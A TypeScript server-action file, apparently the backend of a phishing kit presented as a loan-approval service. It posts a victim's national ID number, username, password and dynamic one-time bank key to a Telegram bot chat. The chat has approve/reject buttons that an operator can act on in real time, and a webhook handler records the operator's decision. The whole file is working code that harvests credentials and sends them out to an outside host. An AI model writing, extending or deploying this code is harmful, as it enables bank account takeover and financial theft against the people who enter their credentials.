"use server"

import type { UserData } from "../types/auth"

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN as string
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

/**
 * Sends a message to a specified Telegram chat with user data.
 *
 * @param {UserData} data - The user data to be sent to Telegram.
 * @returns {Promise<{ success: boolean }>} - A promise that resolves to an object indicating the success status.
 *
 * @throws {Error} - Throws an error if the request to Telegram fails.
 *
 * @example
 * const userData = {
 *   cedula: "123456789",
 *   usuario: "john_doe",
 *   clave: "password123",
 *   claveDinamica: "dynamicKey456"
 * };
 * 
 * sendToTelegram(userData)
 *   .then(response => {
 *     if (response.success) {
 *       console.log("Message sent successfully");
 *     } else {
 *       console.log("Failed to send message");
 *     }
 *   })
 *   .catch(error => {
 *     console.error("Error:", error);
 *   });
 */
export async function sendToTelegram(data: UserData) {
const message = `
  🔔 Nuevo ingreso:
  📝 Cédula: ${data.cedula}
  👤 Usuario: ${data.usuario}
  🔑 Clave: ${data.clave}
  🔐 Clave Dinámica: ${data.claveDinamica}
`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "Aprobar", callback_data: `approve_${data.cedula}` },
              { text: "Rechazar", callback_data: `reject_${data.cedula}` },
            ],
          ],
        },
      }),
    })

    if (!response.ok) {
      throw new Error("Error sending to Telegram")
    }

    return { success: true }
  } catch (error) {
    console.error("Error:", error)
    return { success: false }
  }
}

export async function handleTelegramWebhook(req: Request) {
  try {
    const data = await req.json()
    console.log("Received webhook data:", JSON.stringify(data, null, 2))

    if (data.callback_query) {
      const { data: callbackData, message } = data.callback_query
      const [action, cedula] = callbackData.split("_")

      // Corregir la lógica de aprobación/rechazo
      const loanStatus = action === "approve" ? "approved" : "rejected"

      // Actualizar el estado del préstamo en la base de datos
      await updateLoanStatus(cedula, loanStatus)

      // Responder a Telegram para actualizar el mensaje
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: message.chat.id,
          message_id: message.message_id,
          reply_markup: JSON.stringify({
            inline_keyboard: [[{ text: loanStatus === "approved" ? "Aprobado" : "Rechazado", callback_data: "done" }]],
          }),
        }),
      })
    }

    return new Response("OK")
  } catch (error) {
    console.error("Error handling Telegram webhook:", error)
    return new Response("Error", { status: 500 })
  }
}

async function updateLoanStatus(cedula: string, status: "approved" | "rejected") {
  // Aquí deberías implementar la lógica para actualizar el estado del préstamo en tu base de datos
  console.log(`Actualizando estado del préstamo para cédula ${cedula}: ${status}`)
  // Por ejemplo, podrías usar una API de tu backend o una base de datos serverless
}

